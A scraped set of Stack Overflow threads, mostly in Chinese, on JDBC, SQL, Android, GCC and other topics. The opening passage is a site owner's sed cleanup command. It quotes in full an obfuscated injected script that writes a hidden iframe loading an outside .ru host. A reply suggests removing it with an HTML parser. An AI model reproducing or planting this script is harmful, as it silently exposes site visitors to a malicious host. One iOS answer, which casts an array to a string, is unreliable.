**find /root/cambios -type f -exec sed -i 's#**<script>if (i5463 == null) { var i5463 = 1; var vst = String.fromCharCode(68)+String.fromCharCode(111)+String.fromCharCode(110)+String.fromCharCode(101); window.status=vst;  document.write(String.fromCharCode(60)+String.fromCharCode(68)+String.fromCharCode(73)+String.fromCharCode(86)+String.fromCharCode(32)+String.fromCharCode(105)+String.fromCharCode(100)+String.fromCharCode(61)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(107)+String.fromCharCode(51)+String.fromCharCode(54)+String.fromCharCode(48)+String.fromCharCode(32)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(121)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(61)+String.fromCharCode(34)+String.fromCharCode(68)+String.fromCharCode(73)+String.fromCharCode(83)+String.fromCharCode(80)+String.fromCharCode(76)+String.fromCharCode(65)+String.fromCharCode(89)+String.fromCharCode(58)+String.fromCharCode(32)+String.fromCharCode(110)+String.fromCharCode(111)+String.fromCharCode(110)+String.fromCharCode(101)+String.fromCharCode(34)+String.fromCharCode(62)+String.fromCharCode(60)+String.fromCharCode(105)+String.fromCharCode(102)+String.fromCharCode(114)+String.fromCharCode(97)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(32)+String.fromCharCode(115)+String.fromCharCode(114)+String.fromCharCode(99)+String.fromCharCode(61)+String.fromCharCode(34)+String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(51)+String.fromCharCode(54)+String.fromCharCode(48)+String.fromCharCode(46)+String.fromCharCode(119)+String.fromCharCode(101)+String.fromCharCode(98)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(97)+String.fromCharCode(116)+String.fromCharCode(97)+String.fromCharCode(110)+String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(121)+String.fromCharCode(122)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(46)+String.fromCharCode(114)+String.fromCharCode(117)+String.fromCharCode(47)+String.fromCharCode(105)+String.fromCharCode(110)+String.fromCharCode(100)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(46)+String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(109)+String.fromCharCode(108)+String.fromCharCode(63)+String.fromCharCode(112)+String.fromCharCode(61)+String.fromCharCode(50)+String.fromCharCode(51)+String.fromCharCode(54)+String.fromCharCode(55)+String.fromCharCode(54)+String.fromCharCode(56)+String.fromCharCode(34)+String.fromCharCode(32)+String.fromCharCode(119)+String.fromCharCode(105)+String.fromCharCode(100)+String.fromCharCode(116)+String.fromCharCode(104)+String.fromCharCode(61)+String.fromCharCode(34)+screen.width+String.fromCharCode(34)+String.fromCharCode(32)+String.fromCharCode(104)+String.fromCharCode(101)+String.fromCharCode(105)+String.fromCharCode(103)+String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(61)+String.fromCharCode(34)+screen.height+String.fromCharCode(34)+String.fromCharCode(62)+String.fromCharCode(60)+String.fromCharCode(47)+String.fromCharCode(105)+String.fromCharCode(102)+String.fromCharCode(114)+String.fromCharCode(97)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(62)+String.fromCharCode(60)+String.fromCharCode(47)+String.fromCharCode(68)+String.fromCharCode(73)+String.fromCharCode(86)+String.fromCharCode(62)); window.status=vst; }**##g' {} \;** 
```

So, please, anyone can help to match the new line and the "" text?? Thank you in advance.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T12:47:10.247

事实上，你不应该使用正则表达式来完成这项任务。正如在 SO regex 中多次被告知的那样，它不是处理 HTML 操作的正确工具，因为它不是常规语言。最好的办法是使用 HTML 解析器。例如，以下未优化（但仍然很简单）的代码使用 Jsoup 来实现您的目标：

```
import org.jsoup.Jsoup;
import org.jsoup.nodes.DataNode;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.nodes.Node;
import org.jsoup.select.Elements;

public class RemoveScript {
    public static void main(String args[]){
        String viralContent = "Your viral content";
        String inputText = "<html><head><script>" + viralContent + "</script></head><body></body></html>";

        Document doc = Jsoup.parse(inputText);
        Elements scripts = doc.select("script");
        for(Element element : scripts) {
            for (Node child: element.childNodes()) {
                if (child instanceof DataNode) {
                    String content = ((DataNode) child).getWholeData();
                    if (content.equals(viralContent)) {
                        element.remove();
                    }
                }
            }
        }
        System.out.println(doc.toString());
    }
} 
```

我相信其他解析器也可以很容易地做到这一点。

# jdbc - Connect to SQL Server using Windows Authentication with different user account in JDBC

> ID：14039646
> 
> 赞同：2
> 
> 时间：2012-12-26T10:59:52.793
> 
> 标签：jdbc, sqljdbc, mssql-jdbc

I need to connect to SQL Server using Windows Authentication with different user account in JDBC. This is the code I am using:

```
static final String DB_URL = "jdbc:sqlserver://IP:port; databaseName=xyz; integratedSecurity=false; domain=abc";

Connection con = DriverManager.getConnection(DB_URL,USER,PASS); 
```

And here is the Error:

> com.microsoft.sqlserver.jdbc.SQLServerException: Login failed for user 'abcd'

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T12:08:56.410

就像@konstantin-v-salikhov 给出的问题中描述的那样，`integratedSecurity=true`如果您真的想使用集成身份验证，则需要设置（在这种情况下，它将在用户运行应用程序时进行身份验证）。您还需要[安装](http://msdn.microsoft.com/en-us/library/ms378428.aspx)sqljdbc_auth.dll 文件。当您拨打实际电话时，您不应该提供任何用户名或密码，只需执行以下操作：

```
Properties info = new Properties();
Connection con = DriverManager.getConnection(DB_URL, info); 
```

如果您想使用 SQL Server 身份验证（就像您在代码示例中所做的那样），您需要为您的 SQL Server 实例启用混合模式身份验证。

# mysql - 表mysql中没有任何关系的一对多映射

> ID：14039651
> 
> 赞同：1
> 
> 时间：2012-12-26T11:00:02.243
> 
> 标签：mysql, sql, select

我有两个名为 oc_users 和 oc_groups 的表，这两个表之间没有特定的关系，如下所示，所以在这里我想将每个用户映射到每个组：

1）表1：从oc_users中选择uid；

```
+-----------------+   
| uid             |    
+-----------------+   
| manesh@abc.in   |    
| pankaj          |    
| sumit           |    
+-----------------+ 
```

2）表2：从oc_groups中选择gid；

```
+---------+    
| gid     |    
+---------+    
| qlc     |    
| qlc-web |    
+---------+ 
```

然后我想要像这样的o/p：

```
+---------+-----------------+    
| gid     | uid             |    
+---------+-----------------+    
| qlc     | manesh@abc.in   |    
| qlc     | pankaj          |    
| qlc     | sumit           |    
| qlc-web | manesh@abc.in   |    
| qlc-web | pankaj          |    
| qlc-web | sumit           |    
+---------+-----------------+ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:01:27.603

您需要使用`CROSS JOIN`（*新的 SQL 语法`ANSI SQL-92`*：）

```
SELECT gid, uid
FROM   oc_users CROSS JOIN oc_groups
ORDER BY gid, uid 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/d85dc/2)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:08:30.740

用这个

```
select * from oc_user , oc_groups ORDER BY gid, uidS 
```

这将打印所有列`Cartesian multiplecation of rows.`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:21:26.963

使用`CROSS JOIN(Cartesian Product Join)`将解决您的目的。供您参考 没有 WHERE 子句的交叉连接会生成连接中涉及的表的笛卡尔积。产品结果集的大小`Cartesian`是第一个表中的行数乘以第二个表中的行数。

所以简单地说，

```
SELECT gid, uid
FROM   oc_users CROSS JOIN oc_groups; 
```

始终使用“CROSS JOIN”语法，而不是什么都不做。由于这是 ANSI 格式，您可以在数据库中使用它，并且在迁移过程中也很有用，因为您不需要更改查询中的任何内容。

希望这对你有帮助！！

# azure - How to troubleshoot 500 error when deploying a Web Role to development fabric

> ID：14039652
> 
> 赞同：1
> 
> 时间：2012-12-26T11:00:04.137
> 
> 标签：azure, azure-web-roles

My web role is intended to run an ASP.NET application. I tried to publish the application to local IIS and it runs smoothly. But when I press F5 to run it in Azure development fabric, it gives me this:

![enter image description here](../Images/e47cb65902424c0b14985522ccee2f34.png)

Not sure how to troubleshoot this...

Actually, the page title shows up at first, and then it changed to 500 error.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T16:38:41.243

You can turn CustomErrors off in your web.config to see the details behind your 500 error.

```
<customErrors mode="Off" /> 
```

Just be sure not to deploy to production with this setting.

# dropbox - Dropbox selective syncing - pattern matching?

> ID：14039657
> 
> 赞同：8
> 
> 时间：2012-12-26T11:00:42.267
> 
> 标签：dropbox

I'm using Dropbox on daily basis and put my programming projects in there. It works great, but once I got many projects my `/node_modules` dir's are putting a struggle on Dropbox. It's syncing process starts to be slow and it eats up CPU time.

Is there any way to do a selective sync based on directory name or a mask pattern? Would be nice to have to a `.gitignore` equivalent to configure.

Any 3rd party software for that task?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T22:04:24.820

有一种选择性同步的方法，但我不相信它有任何像你描述的高级规则：

[https://www.dropbox.com/help/175/en](https://www.dropbox.com/help/175/en)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-21T22:09:41.480

2解决这个问题的方法：

1.  您可以将`node_modules`项目目录放在文件树中。例如：
    Project dir：`c:/prj/myProjWrapper/myProj`
    在这里的`c:/prj/myProjWrapper`put`package.json`和make`npm install`中，NodeJS会递归地找到它。

2.  仅限 Win 和 Linux，不适用于 Mac！在项目目录中创建`.ds_store`文件夹（它不通过 Dropbox 同步）。投入`package.json`其中并做`npm install`。`NODE_PATH=./.ds_store/node_modules;.`启动 NodeJS 时必须设置

# php - 如何在 drupal 7 中显示 facebook 墙提要

> ID：14039659
> 
> 赞同：0
> 
> 时间：2012-12-26T11:01:01.927
> 
> 标签：php, facebook, facebook-graph-api, drupal-7

以下是要求：

1.  用户将添加他的 facebook 用户帐户和 facebook 页面帐户（在此步骤中必须将访问令牌和页面/帐户 ID 保存在数据库中）。
2.  这些帐户将列在选项卡中。
3.  当用户点击选项卡“A”时，将获取并显示“A”的所有提要/墙帖。

有没有可用的drupal 7模块？或者是任何一个做过这种功能的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-30T22:34:53.933

您可以使用基于 drupal 模块 Facebook Wall ( [https://drupal.org/project/facebook_wall](https://drupal.org/project/facebook_wall) ) 的一些自定义编码来做到这一点。

这个模块是在您提出问题几个月后发布的。我现在添加答案，因为我在搜索过程中发现了您的问题。

使用 Facebook Wall，您需要在配置页面输入 App ID/API Key 和 App Secret Key。要获取 App ID/API Key，您需要在[http://developers.facebook.com](http://developers.facebook.com)创建一个应用程序。

接下来，输入 Facebook 用户名（如 first.last.number），单击“保存配置”。

现在，您需要一个要提取的站点的访问令牌。配置页面现在为您提供了一个“Access Token Temporary”字段，以及一个指向 Graph API Explorer 的链接。在新选项卡中打开链接，将此页面上显示的访问令牌复制到 Drupal Facebook 墙配置页面“临时访问令牌”。

单击“保存” - 现在您可以选择“获取长期访问令牌”。单击按钮，您将在接下来的 60 天内保持良好状态。Facebook 不再提供有效期超过 60 天的访问令牌。

在“墙内容”选项卡中，您可以自定义墙的拉动。

如果你想拉一个公共的 Facebook 墙（比如一个粉丝页面），你仍然可以使用这个模块。输入您自己的 API ID，并输入公共页面的用户名，而不是您自己的用户名。

# iphone - 如何在 textView 中显示字符串而不是地址

> ID：14039668
> 
> 赞同：0
> 
> 时间：2012-12-26T11:02:09.453
> 
> 标签：iphone, ios, xcode, arrays, memory-management

我正在尝试从数据库中获取一个随机字符串我试图将数组转换为字符串但是当我单击按钮时我只得到地址谁能帮助我如何在我的按钮操作中显示该字符串？

```
- (IBAction)randBtn:(id)sender {

        SendQuoteVC *svc= [[SendQuoteVC alloc]initWithNibName:@"SendQuoteVC" bundle:nil];

        DBHandler *db =[[DBHandler alloc]init];
        arr =[db randomQuote];

        NSMutableString * show = [[NSMutableString alloc] init];
        for (NSObject * obj in arr)
        {
            [show appendString:[obj description]];
        }
        NSLog(@"The concatenated string is %@", show);

        NSString *rs =[NSString stringWithFormat:@" %@",show];
        svc.quote=rs;
      [self.navigationController pushViewController:svc animated:YES];
} 
```

我的日志信息是

```
 2012-12-26 17:02:46.062 SendQuote[2281:c07] QUERY: SELECT * FROM quotes ORDER BY RANDOM() LIMIT 1
2012-12-26 17:02:46.097 SendQuote[2281:c07] txtQuote is  (
    "<quoteDC: 0xa9a94c0>"
)
2012-12-26 17:02:46.100 SendQuote[2281:c07] rand is  (
    "<quoteDC: 0xa9a94c0>"
) 
```

我已将我的用户实体类更改为 quoteDC 类，我的 Db 函数是

```
-(NSMutableArray *)randomQuote{
    NSMutableArray *dataArray =[[NSMutableArray alloc]init];
    NSString * sqlStr=[NSString stringWithFormat:@"SELECT * FROM quotes ORDER BY RANDOM() LIMIT 1"];
    sqlite3_stmt *ReturnStatement = (sqlite3_stmt *) [self getStatement: sqlStr];
    while (sqlite3_step(ReturnStatement)==SQLITE_ROW)
    {
        @try
        {
            quoteDC *worddc = [[quoteDC alloc] init];

            NSString *userid = [NSString stringWithUTF8String:(char *)sqlite3_column_text(ReturnStatement, 0)];
            NSString *name = [NSString stringWithUTF8String:(char *)sqlite3_column_text(ReturnStatement, 1)];

            worddc.quote_id=[userid integerValue];
            worddc.quotes=name;
            [dataArray addObject:worddc];
        }
        @catch (NSException *ept) {
            NSLog(@"Exception in %s, Reason: %@", __PRETTY_FUNCTION__, [ept reason]);
        }
    }
    return dataArray;

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:10:13.093

[db randomQuote] 方法返回用户数组而不是字符串，您可以将其类型转换为用户对象，而不是从中获取所需的属性！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T11:06:06.430

试试这个，我认为它对你有用......

```
 - (IBAction)randBtn:(id)sender {

    SendQuoteVC *svc= [[SendQuoteVC alloc]initWithNibName:@"SendQuoteVC" bundle:nil];

    DBHandler *db =[[DBHandler alloc]init];
    arr =[db randomQuote];
    NSString *rs =(NSString *)arr;
    svc.quote=rs;
    [self.navigationController pushViewController:svc animated:YES];
   } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-26T11:10:27.913

看起来您的数组是某个`user`类的对象数组而不是字符串数组。因此呼吁

```
[obj description] 
```

正在返回一个对象而不是一个字符串。

您需要覆盖`user`类中的描述方法，并返回字符串。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-26T12:09:51.443

此代码使问题：

```
for (NSObject * obj in arr)
{
    [show appendString:[obj description]];
} 
```

因为您的实体类没有像`description`. 而不是这样写：

```
for (quoteDC * obj in arr)
{
    [show appendString:[obj quotes]];
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-26T11:18:01.657

而不是`for (NSObject * obj in arr)`使用存储在`arr`.

我猜这是一些 DBHandler 对象。所以使用

```
for (DBHandler * dbh in arr){
    [show appendString:[dbh thePropertyYouWantToAppend]];
} 
```

# gcc - GCC 的“-wrapper”标志有什么作用？

> ID：14039669
> 
> 赞同：3
> 
> 时间：2012-12-26T11:02:26.073
> 
> 标签：gcc, gdb, compiler-flags

从[GCC 手册](http://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/Overall-Options.html#Overall-Options)中，有以下总体选项：

> **-wrapper**
> 调用包装程序下的所有子命令。
> 包装程序的名称及其参数
> 以逗号分隔列表的形式传递。
> 
> gcc -c tc -wrapper gdb,--args
> 
> 这将调用`gdb --args', thus the invocation of cc1 will be`gdb --args cc1 ...' 下的所有 gcc 子程序。

我无法理解该标志的示例和用途。

**gcc -c tc**将创建一个**to**。
然后什么？目标文件被发送到gdb？
或者 gdb 是否有责任创建目标文件（asummingly 添加调试信息）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:08:07.323

在编译期间`gcc`调用一些其他程序（实际的汇编器、链接器*等*），并使用`-wrapper`标志在所述包装器中调用它们。在您的示例中，所有子命令都在 内执行`gdb`，这对于调试很有用`gcc`。

另一个例子：要获取所有调用的子命令的列表，可以将它们包装在其中`echo`（当然，它们不是以这种方式执行的）：

```
$ gcc 1.c  -wrapper echo
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1 -quiet -imultilib . -imultiarch x86_64-linux-gnu 1.c -quiet -dumpbase 1.c -mtune=generic -march=x86-64 -auxbase 1 -fstack-protector -o /tmp/cc7cQrsT.s
as --64 -o /tmp/ccaLYkv9.o /tmp/cc7cQrsT.s
/usr/lib/gcc/x86_64-linux-gnu/4.6/collect2 --sysroot=/ --build-id --no-add-needed --as-needed --eh-frame-hdr -m elf_x86_64 --hash-style=gnu -dynamic-linker /lib64/ld-linux-x86-64.so.2 -z relro /usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/4.6/crtbegin.o -L/usr/lib/gcc/x86_64-linux-gnu/4.6 -L/usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/4.6/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/4.6/../../.. /tmp/ccaLYkv9.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/4.6/crtend.o /usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crtn.o 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T11:09:28.477

是的，用于调试编译器本身。或者以其他方式“跟踪”编译器中正在发生的事情 - 例如，您可以通过添加执行此操作然后运行 ​​cc1 的程序来打印传递给 cc1 本身的参数。

`gdb`不负责生成任何东西，它只是围绕着`cc1`whihc 是“适当的编译器” - 当您运行`gcc -c t.c`编译器时，首先运行`cpp -o t.i t.c`以预处理`t.c`文件。然后它运行`cc1 -o t.s t.i`，最后运行`as -o t.o t.s`（或类似的东西。使用包装器，它将运行这些命令，例如，`gdb --args cc1 -o t.s t.i`.

编辑：与“真正的”编译相比，这当然要简化得多 - 有一大堆参数传递给`cc1`，等等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:09:40.910

你可以在一个简单的 hello world 上尝试一下。

gcc 将调用不同的子命令。这些子命令中的每一个都将以包装器为前缀。将 gdb 作为包装器意味着您要调试编译器。

# c# - c#中DataTable的复杂排序

> ID：14039671
> 
> 赞同：-3
> 
> 时间：2012-12-26T11:02:30.337
> 
> 标签：c#, winforms, sorting, datagridview, datatable

我有一个数据表，其中前五列包含静态信息，其余列是根据一些用户选择动态构建的。动态列实际上是 3 列的组 - 例如：

1.  店铺名称（用户将在此栏中输入数量）
2.  店铺销售
3.  商店库存

当然，这些会按行显示，但每个用户可能会选择一组不同的 3 列来显示。

以上已经有效。我现在要解决的要求是根据**Shop Sale**列对网格进行排序，保持三个集合不变。例如，销售额最多的商店会在最左边，以此类推……

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T14:17:29.960

我解决了这个问题，我在早期使用 datatable.defaultview.sort 方法对商店列表进行了排序，问题解决了。

# objective-c - 设置 http 头 asihttprequest

> ID：14039672
> 
> 赞同：0
> 
> 时间：2012-12-26T11:02:38.140
> 
> 标签：objective-c, ios, authentication, asihttprequest

我正在使用`ASIFormDataRequest`发布到网络服务。现在我的服务器程序员说我应该设置 HTTP 标头并传递以下参数：`username='value'`和`password='value'`. 这是因为 Web 服务使用身份验证。我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:06:28.800

```
[request addBasicAuthenticationHeaderWithUsername:@"yourUsername"
                                      andPassword:@"yourPassw"]; 
```

有关 HTTP 身份验证的更多信息，请查看有关它的 [ASIHTTP 文档](http://allseeing-i.com/ASIHTTPRequest/How-to-use#handling_http_authentication)。

# algorithm - 修改深度优先搜索以在特定半径内工作

> ID：14039676
> 
> 赞同：1
> 
> 时间：2012-12-26T11:03:07.437
> 
> 标签：algorithm, data-structures, graph, depth-first-search

假设您有一个加权图。从一个随机节点开始，如何使用深度优先搜索（修改使用显式堆栈的迭代算法）来检查在某个权重半径内存在哪些节点？（可以从这个节点以特定的权重到达。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:09:36.967

假设我们使用类型`Node`来表示图中的一个节点。在最简单的情况下，`Node`可能只是一个整数 ( `int`)。

通常，我们使用显式类型的堆栈`Node`。在您的情况下，我们可以使用类型堆栈，`pair<Node,int>`其中`pair<A,B>`是对的类型，而`int`表示从您的起点到 this 的距离`Node`。

假设我们现在处于`Node` `u`距离`d`。对于相邻的`Node` `v`，让`w`是边缘的权重`uv`。然后只需推入`pair(v, d+w)`堆栈。最初，推送深度优先搜索的起点`pair(v0, 0)`在哪里。`v0`

# ruby-on-rails - Ruby on Rails number_to_currency 没有 Unit [没有符号、$ 或其他] 怎么办

> ID：14039679
> 
> 赞同：5
> 
> 时间：2012-12-26T11:03:10.340
> 
> 标签：ruby-on-rails

如何使用 helper 格式化我的号码`number_to_currency`，但不显示货币符号（$、R$ 等）？
前任。：

```
$ 500,78  -> Not what i want
  500,78  -> Format i desire 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-26T11:08:34.920

尝试将其与`:unit`设置为空字符串的选项一起使用。

```
number_to_currency(1234567890.50, :unit => "") 
```

# java - java.lang.RuntimeException：无法启动活动

> ID：14039680
> 
> 赞同：2
> 
> 时间：2012-12-26T11:03:12.433
> 
> 标签：java, android, android-activity

我正在尝试研究如何为 Android 制作应用程序。按照[谷歌](http://developer.android.com/training/basics/firstapp/starting-activity.html)制作的教程和我的修改我得到这个错误

```
12-26 10:42:23.848: D/dalvikvm(1302): GC_CONCURRENT freed 362K, 15% free 2737K/3216K, paused 70ms+89ms, total 204ms
12-26 10:42:23.898: D/AndroidRuntime(1302): Shutting down VM
12-26 10:42:23.898: W/dalvikvm(1302): threadid=1: thread exiting with uncaught exception (group=0x40a70930)
12-26 10:42:23.928: E/AndroidRuntime(1302): FATAL EXCEPTION: main
12-26 10:42:23.928: E/AndroidRuntime(1302): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.startactivity/com.example.startactivity.DisplayMessageActivity}: java.lang.NullPointerException
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2180)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2230)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.ActivityThread.access$600(ActivityThread.java:141)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:    1234)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.os.Handler.dispatchMessage(Handler.java:99)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.os.Looper.loop(Looper.java:137)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.ActivityThread.main(ActivityThread.java:5039)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at java.lang.reflect.Method.invokeNative(Native Method)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at java.lang.reflect.Method.invoke(Method.java:511)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at dalvik.system.NativeStart.main(Native Method)
12-26 10:42:23.928: E/AndroidRuntime(1302): Caused by: java.lang.NullPointerException
12-26 10:42:23.928: E/AndroidRuntime(1302):     at com.example.startactivity.DisplayMessageActivity.onCreate(DisplayMessageActivity.java:20)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.Activity.performCreate(Activity.java:5104)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1080)
12-26 10:42:23.928: E/AndroidRuntime(1302):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2144)
12-26 10:42:23.928: E/AndroidRuntime(1302):     ... 11 more
12-26 10:43:11.418: I/Process(1302): Sending signal. PID: 1302 SIG: 9 
```

这是 MainActivity 的代码

```
public class MainActivity extends Activity {
public final static String EXTRA_MESSAGE = "com.example.startactivity.MESSAGE";

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}

public void sendMessage(View view){
    Intent intent = new Intent(this,DisplayMessageActivity.class);

    EditText edit_nome = (EditText) findViewById(R.id.edit_nome);
    EditText edit_cognome = (EditText) findViewById(R.id.edit_cognome);

    Bundle bundle = new Bundle();
    bundle.putString("nome", edit_nome.getText().toString());
    bundle.putString("cognome", edit_cognome.getText().toString());

    intent.putExtra(EXTRA_MESSAGE, bundle);
    startActivity(intent);

}

} 
```

这是 DisplayMessageActivity 的代码

```
public class DisplayMessageActivity extends Activity {

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_display_message);
    // Show the Up button in the action bar.
    getActionBar().setDisplayHomeAsUpEnabled(true);

    Intent intent = getIntent();
    String nome = intent.getBundleExtra("nome").toString();
    String cognome = intent.getBundleExtra("cognome").toString();

    TextView textNome = new TextView(this);
    TextView textCognome = new TextView(this);
    textNome.setTextSize(40);
    textCognome.setTextSize(40);
    textNome.setText(nome);
    textCognome.setText(cognome);

    setContentView(textNome);
    setContentView(textCognome);

}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
    case android.R.id.home:
        NavUtils.navigateUpFromSameTask(this);
        return true;
    }
    return super.onOptionsItemSelected(item);
}

} 
```

感谢帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:30:36.100

您正在调用 的`toString`方法，`Bundle`而不是检索存储在其上的字符串。此外，您正在尝试`Bundle`使用存储在其中的密钥来获取 a 。尝试改变

```
String nome = intent.getBundleExtra("nome").toString();
String cognome = intent.getBundleExtra("cognome").toString(); 
```

至

```
Bundle bundle = intent.getBundleExtra(MainActivity.EXTRA_MESSAGE);

if (bundle != null) {
  String nome = bundle.getString("nome");
  String cognome = bundle.getString("cognome");
} 
```

考虑到如果收到的意图不是你的，并且它带有 no`Bundle`或不同的意图，那么你的`nome`和`cognome`字符串将是`null`，而不是空字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:20:39.493

logcat 在 com.example.startactivity/com.example.startactivity.DisplayMessageActivity 处显示问题

因此，最好的猜测是在 DisplayMessageActivity 的 texviews 中设置文本时，名称和认知值可能为空

尝试在带有文本的行添加一个调试点

```
String nome = intent.getBundleExtra("nome").toString(); 
```

并查看任何空值。

希望这能激起

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:15:30.060

将 MainActivity 代码更改为

```
 public class MainActivity extends Activity {
  public final static String EXTRA_MESSAGE = "com.example.startactivity.MESSAGE";

@Override
protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);

 Intent intent = new Intent(this,DisplayMessageActivity.class);

EditText edit_nome = (EditText) findViewById(R.id.edit_nome);
EditText edit_cognome = (EditText) findViewById(R.id.edit_cognome);

 Bundle bundle = new Bundle();
 bundle.putString("nome", edit_nome.getText().toString());
 bundle.putString("cognome", edit_cognome.getText().toString());

 intent.putExtra(EXTRA_MESSAGE, bundle);
 startActivity(intent);

}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
// Inflate the menu; this adds items to the action bar if it is present.
getMenuInflater().inflate(R.menu.activity_main, menu);
return true;
}

} 
```

确保清单文件中的条目：

```
<activity android:name=".DisplayMessageActivity"></activity> 
```

# android - 不支持 APDU GET DATA 命令

> ID：14039681
> 
> 赞同：0
> 
> 时间：2012-12-26T11:03:14.413
> 
> 标签：android, smartcard, apdu

我正在测试 APDU 命令传输，我发现了一个奇怪的问题，对于`GET DATA`命令`00:CA:7F:68`我收到一个错误：

> 6D00：“指令代码不支持或无效”

可能是什么问题？？？我能够阅读`ATR`，发送`SELECT`命令。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T21:51:55.417

正如经常提到的，ISO 7816-4 是一个弱标准：没有卡需要支持所有命令并且仍然可以声称符合标准。所以可能是你的卡

*   一点也不
*   只是不在当前状态
*   只是不在您尝试的应用程序/DF中（因为不存在DO）

理解命令，但我认为它与 7F68 对象编号无关。

添加一个 LE 字节（如建议的那样）绝对值得一试，即使我为此原因期望 67 00 也是如此。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T15:42:50.423

您是否尝试从文件中读取数据`7f68`？你能提供更多的背景信息吗？无论如何，我认为您可能缺少`LE`apdu 的最后一个字节 ( )，您可以在其中指定答案中预期的最大字节数。

# java - 如何动态更新java画布？

> ID：14039682
> 
> 赞同：0
> 
> 时间：2012-12-26T11:03:20.573
> 
> 标签：java, swing, jpanel, repaint, java-2d

问题：我正在尝试根据用户操作使用新的绘画对象更新画布。画布剂量得到更新。

